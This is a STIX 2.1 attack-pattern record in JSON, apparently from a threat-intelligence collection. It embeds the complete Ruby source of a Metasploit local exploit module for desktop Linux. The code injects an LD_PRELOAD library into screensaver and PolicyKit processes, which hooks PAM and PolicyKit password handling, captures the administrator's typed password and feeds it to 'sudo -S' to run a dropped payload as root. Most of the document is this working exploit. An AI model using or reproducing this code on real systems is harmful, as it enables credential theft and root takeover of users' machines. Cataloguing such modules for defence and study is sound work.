{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f1ed156b-d83e-488e-b894-1c6690dd7bf7",
    "created": "2024-08-14T16:59:11.214748Z",
    "modified": "2024-08-14T16:59:11.214753Z",
    "name": "Desktop Linux Password Stealer and Privilege Escalation",
    "description": " This module steals the user password of an administrative user on a desktop Linux system when it is entered for unlocking the screen or for doing administrative actions using PolicyKit. Then, it escalates to root privileges using sudo and the stolen user password. It exploits the design weakness that there is no trusted channel for transferring the password from the keyboard to the actual password verification against the shadow file (which is running as root since /etc/shadow is only readable to the root user). Both screensavers (xscreensaver/gnome-screensaver) and PolicyKit use a component running under the current user account to query for the password and then pass it to a setuid-root binary to do the password verification. Therefore, it is possible to inject a password stealer after compromising the user account. Since sudo requires only the user password (and not the root password of the system), stealing the user password of an administrative user directly allows escalating to root privileges. Please note, you have to start a handler as a background job before running this exploit since the exploit will only create a shell when the user actually enters the password (which may be hours after launching the exploit). Using exploit/multi/handler with the option ExitOnSession set to false should do the job.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/desktop_privilege_escalation.rb",
            "external_id": "desktop_privilege_escalation.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'base64'\nrequire 'metasm'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n\n  def initialize(info={})\n    super( update_info( info, {\n      'Name'          => 'Desktop Linux Password Stealer and Privilege Escalation',\n      'Description'   => %q{\n        This module steals the user password of an administrative user on a desktop Linux system\n        when it is entered for unlocking the screen or for doing administrative actions using\n        PolicyKit. Then, it escalates to root privileges using sudo and the stolen user password.\n        It exploits the design weakness that there is no trusted channel for transferring the\n        password from the keyboard to the actual password verification against the shadow file\n        (which is running as root since /etc/shadow is only readable to the root user). Both\n        screensavers (xscreensaver/gnome-screensaver) and PolicyKit use a component running under\n        the current user account to query for the password and then pass it to a setuid-root binary\n        to do the password verification. Therefore, it is possible to inject a password stealer\n        after compromising the user account. Since sudo requires only the user password (and not\n        the root password of the system), stealing the user password of an administrative user\n        directly allows escalating to root privileges. Please note, you have to start a handler\n        as a background job before running this exploit since the exploit will only create a shell\n        when the user actually enters the password (which may be hours after launching the exploit).\n        Using exploit/multi/handler with the option ExitOnSession set to false should do the job.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => ['Jakob Lell'],\n      'DisclosureDate' => '2014-08-07',\n      'Platform'      => 'linux',\n      'Arch'          => [ARCH_X86, ARCH_X64],\n      'SessionTypes'  => ['shell', 'meterpreter'],\n      'Targets'       =>\n        [\n          ['Linux x86', {'Arch' => ARCH_X86}],\n          ['Linux x86_64', {'Arch' => ARCH_X64}]\n        ],\n      'DefaultOptions' =>\n        {\n          'PrependSetresuid' => true,\n          'PrependFork' => true,\n          'DisablePayloadHandler' => true\n        },\n      'DefaultTarget' => 0,\n      }\n    ))\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory for storing temporary files on the target system', '/tmp'])\n    ]\n  end\n\n  def check\n    check_command = 'if which perl && '\n    check_command << 'which sudo && '\n    check_command << 'id|grep -E \\'sudo|adm\\' && '\n    check_command << 'pidof xscreensaver gnome-screensaver polkit-gnome-authentication-agent-1;'\n    check_command << 'then echo OK;'\n    check_command << 'fi'\n\n    output = cmd_exec(check_command).gsub(\"\\r\", '')\n\n    vprint_status(output)\n\n    if output['OK'] == 'OK'\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # Cannot use generic/shell_reverse_tcp inside an elf\n    # Checking before proceeds\n    pl = generate_payload_exe\n\n    exe_file = \"#{datastore['WritableDir']}/#{rand_text_alpha(3 + rand(5))}.elf\"\n\n    print_status(\"Writing payload executable to '#{exe_file}'\")\n    write_file(exe_file, pl)\n    cmd_exec(\"chmod +x #{exe_file}\")\n\n\n    cpu = nil\n    if target['Arch'] == ARCH_X86\n      cpu = Metasm::Ia32.new\n    elsif target['Arch'] == ARCH_X64\n      cpu = Metasm::X86_64.new\n    end\n    lib_data = Metasm::ELF.compile_c(cpu, c_code(exe_file)).encode_string(:lib)\n    lib_file = \"#{datastore['WritableDir']}/#{rand_text_alpha(3 + rand(5))}.so\"\n\n    print_status(\"Writing lib file to '#{lib_file}'\")\n    write_file(lib_file,lib_data)\n\n    print_status('Restarting processes (screensaver/policykit)')\n    restart_commands = get_restart_commands\n    restart_commands.each do |cmd|\n      cmd['LD_PRELOAD_PLACEHOLDER'] = lib_file\n      cmd_exec(cmd)\n    end\n    print_status('The exploit module has finished. However, getting a shell will probably take a while (until the user actually enters the password). Remember to keep a handler running.')\n  end\n\n  def get_restart_commands\n    get_cmd_lines = 'pidof xscreensaver gnome-screensaver polkit-gnome-authentication-agent-1|'\n    get_cmd_lines << 'perl -ne \\'while(/(\\d+)/g){$pid=$1;next unless -r \"/proc/$pid/environ\";'\n    get_cmd_lines << 'print\"PID:$pid\\nEXE:\".readlink(\"/proc/$pid/exe\").\"\\n\";'\n    get_cmd_lines << '$/=undef;'\n    get_cmd_lines << 'for(\"cmdline\",\"environ\"){open F,\"</proc/$pid/$_\";print \"$_:\".unpack(\"H*\",<F>),\"\\n\";}}\\''\n\n    text_output = cmd_exec(get_cmd_lines).gsub(\"\\r\",'')\n    vprint_status(text_output)\n\n    lines = text_output.split(\"\\n\")\n\n    restart_commands = []\n    i=0\n    while i < lines.length - 3\n      m = lines[i].match(/^PID:(\\d+)/)\n\n      if m\n        pid = m[1]\n        vprint_status(\"PID=#{pid}\")\n        print_status(\"Found process: \" + lines[i+1])\n\n        exe = lines[i+1].match(/^EXE:(\\S+)$/)[1]\n        vprint_status(\"exe=#{exe}\")\n\n        cmdline = [lines[i+2].match(/^cmdline:(\\w+)$/)[1]].pack('H*').split(\"\\x00\")\n        vprint_status(\"CMDLINE=\" + cmdline.join(' XXX '))\n\n        env = lines[i+3].match(/^environ:(\\w+)$/)[1]\n        restart_command = 'perl -e \\'use POSIX setsid;open STDIN,\"</dev/null\";open STDOUT,\">/dev/null\";open STDERR,\">/dev/null\";exit if fork;setsid();'\n        restart_command << 'kill(9,' + pid + ')||exit;%ENV=();for(split(\"\\0\",pack(\"H*\",\"' + env + '\"))){/([^=]+)=(.*)/;$ENV{$1}=$2}'\n        restart_command << '$ENV{\"LD_PRELOAD\"}=\"LD_PRELOAD_PLACEHOLDER\";exec {\"' + exe + '\"} ' + cmdline.map{|x| '\"' + x + '\"'}.join(\", \") + '\\''\n\n        vprint_status(\"RESTART: #{restart_command}\")\n        restart_commands.push(restart_command)\n      end\n\n      i+=1\n    end\n\n    restart_commands\n  end\n\n  def c_code(exe_file)\n    c = %Q|\n// A few constants/function definitions/structs copied from header files\n#define RTLD_NEXT      ((void *) -1l)\nextern uintptr_t dlsym(uintptr_t, char*);\n// Define some structs to void so that we can ignore all dependencies from these structs\n#define FILE void\n#define pam_handle_t void\nextern FILE *popen(const char *command, const char *type);\nextern int pclose(FILE *stream);\nextern int fprintf(FILE *stream, const char *format, ...);\nextern char *strstr(const char *haystack, const char *needle);\nextern void *malloc(unsigned int size);\n\nstruct pam_message {\n  int msg_style;\n  const char *msg;\n };\n\nstruct pam_response {\n  char *resp;\n  int resp_retcode;\n};\n\nstruct pam_conv {\n  int (*conv)(int num_msg, const struct pam_message **msg,\n  struct pam_response **resp, void *appdata_ptr);\n  void *appdata_ptr;\n};\n\nvoid run_sudo(char* password) {\n  FILE* sudo = popen(\"sudo -S #{exe_file}\", \"w\");\n  fprintf(sudo,\"%s\\\\n\",password);\n  pclose(sudo);\n}\n\nint my_conv(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr) {\n  struct pam_conv *orig_pam_conversation = (struct pam_conv *)appdata_ptr;\n  int i;\n  int passwd_index = -1;\n  for(i=0;i<num_msg;i++){\n    if(strstr(msg[i]->msg,\"Password\") >= 0){\n      passwd_index = i;\n    }\n  }\n  int result = orig_pam_conversation->conv(num_msg, msg, resp, orig_pam_conversation->appdata_ptr);\n  if(passwd_index >= 0){\n    run_sudo(resp[passwd_index]->resp);\n  }\n  return result;\n}\n\nint pam_start(const char *service_name, const char *user, const struct pam_conv *pam_conversation, pam_handle_t **pamh) __attribute__((export)) {\n  static int (*orig_pam_start)(const char *service_name, const char *user, const struct pam_conv *pam_conversation, pam_handle_t **pamh);\n  if(!orig_pam_start){\n    orig_pam_start = dlsym(RTLD_NEXT,\"pam_start\");\n  }\n  struct pam_conv *my_pam_conversation = malloc(sizeof(struct pam_conv));\n  my_pam_conversation->conv = &my_conv;\n  my_pam_conversation->appdata_ptr = (struct pam_conv *)pam_conversation;\n  return orig_pam_start(service_name, user, my_pam_conversation, pamh);\n}\n\nvoid polkit_agent_session_response (void *session, char *response) __attribute__((export)) {\n  static void *(*orig_polkit_agent_session_response)(void *session, char* response);\n  if(!orig_polkit_agent_session_response){\n    orig_polkit_agent_session_response = dlsym(RTLD_NEXT,\"polkit_agent_session_response\");\n  }\n  run_sudo(response);\n  orig_polkit_agent_session_response(session, response);\n  return;\n}\n|\n    c\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-08-07",
    "x_mitre_platforms": [
        "linux'"
    ]
}